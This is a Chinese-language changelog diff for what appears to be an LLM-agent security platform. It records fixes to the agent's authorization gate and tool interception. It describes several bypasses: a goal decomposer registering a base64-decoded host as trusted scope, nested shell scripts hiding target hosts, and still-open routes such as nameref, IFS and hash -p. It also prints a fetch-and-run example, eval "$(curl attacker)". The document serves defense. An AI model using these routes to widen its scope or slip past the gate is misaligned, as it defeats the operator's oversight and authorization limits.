@@ -2,6 +2,75 @@
 
 本项目的重要变更记录在此文件中，格式参考 [Keep a Changelog](https://keepachangelog.com/zh-CN/1.1.0/)。
 
+## v0.3.23-fix5 — 拦截面默认收紧、拆解器扩权封堵、脚本嵌套解析
+
+**建议立即升级。** 上一版关掉了授权闸的间接引用绕过，但留了三个口子：拦截规则只
+覆盖 8 个工具、目标拆解器能把推导出来的主机登记成受信范围、脚本的嵌套入口不解析。
+本版逐条封堵，且都有端到端实测。
+
+### 拦截规则默认覆盖全部工具
+
+`intercept` 原先只对 `Bash/WebFetch/web_search/shell_open/shell_send/Write/Edit/MultiEdit`
+这 8 个名字求值。`delete_assets_by_host`（跨任务硬删全局资产）、`spawn_task`（启动
+真实 LLM 花费）、`create_custom_tool`、`create_mcp`、以及所有 `mcp__*` 工具**完全
+不在规则面内**——AGENTS.md 说「破坏性/外传门禁已下沉到 DB 规则」，但规则对它们从不
+触发。
+
+现在默认是「除只读工具外全部拦截」：新增 `interceptExemptTools` 白名单（25 个纯读
+或只写平台自身存储的工具，如 `list_assets`/`record_fact`/`add_intent`），其余一律
+进规则匹配。设置页的覆盖清单也从 8 项变成实际的 44 项，SDK 内置工具（无 tools 表
+记录）一并列出。
+
+保存过 `intercept_enabled_tools` 的部署不受影响——那是显式选择，仍然优先。
+
+### 目标拆解器不能再扩大授权边界
+
+拆解器读取的是操作员写的任务描述。它此前可以把**推导出来**的主机登记成
+`source=goals` 的可信 scope 行，而 `goals` 是授权闸认可的两个来源之一。实测：任务
+描述里只给了一段 base64，拆解器解码后把 `sneaky-host.example` 写进了 scope。
+
+现在只有**在任务描述或目标里原样出现**（忽略大小写，允许带 scheme/斜杠）的值才能
+登记为受信范围。推导出来的值直接拒绝并返回原因：
+
+```
+{"added":null,"errors":{"0":"该范围未在任务描述或目标中原样出现，不能作为可信授权范围登记：sneaky-host.example"}}
+```
+
+拒绝而不是静默降级为 `agent`，是为了让模型立刻知道边界没变，不会误以为自己已经扩权。
+
+### 脚本的嵌套入口
+
+`sh a.sh` 只解析 a.sh 本身。a.sh 里再 `source b.sh`、`eval '...'`、
+`echo x | xargs curl ...`、`find -exec` 调起的命令，全部不可见——判定器和授权闸
+都看不到里面真正要连的主机。
+
+现在 `source` 的脚本体、`eval` 的参数、`xargs`/`find -exec` 的尾部命令都递归解析
+（深度上限 4、总量上限 16 个展开，防自引用）。实测：
+
+```
+sh /tmp/nest/a.sh      (a.sh: source /tmp/nest/b.sh；b.sh: curl http://deep-target.example/)
+→ Blocked: 目标不在本任务授权范围内：deep-target.example
+```
+
+展开只对 shell 脚本生效：把 Python/JS 的正文当 shell 解析会产生语法错误，进而
+fail-closed 成「脚本不完整」，把正常调用误伤掉。命令自己生成的文件（`sed ... > new.sh`）
+也不重复展开——内容已经在快照里，再解析等于对数据做语法分析。
+
+### 验证
+
+- 6 文件 +323/−24，新增 1 个测试文件、2 组回归用例。
+- `go vet ./...` 干净；`go test -p 1 ./...` 15 包全绿（真实 PostgreSQL 18.6）。
+- 端到端（真实服务 + 真实 LLM）：
+  - 嵌套 source 目标被拦截，监听器 0 次连接；
+  - 拆解器两次尝试登记推导主机均被拒，任务 scope 保持为空；
+  - 覆盖清单 44 项，`delete_assets_by_host`/`spawn_task`/`create_custom_tool`/`create_mcp` 均在列，`record_fact`/`list_assets`/`add_intent` 保持豁免。
+
+### 已知未修
+
+`intercept` 的 shell 静态分析仍有理论绕过面（`nameref`、非常规 `IFS`、`hash -p`
+等），未逐条构造真实命令验证，不纳入本版。授权闸仍是「尽力提取 + 提取失败即阻断」
+的模型，对完全动态拼接的目标（`eval "$(curl attacker)"`）只能靠 fail-closed 兜底。
+
 ## v0.3.23-fix4 — 授权闸间接引用修复（实测 4 条绕过已关闭）
 
 **建议立即升级。** 本版修的是上一轮审计遗留的一条主线问题：**授权闸只认命令行里的
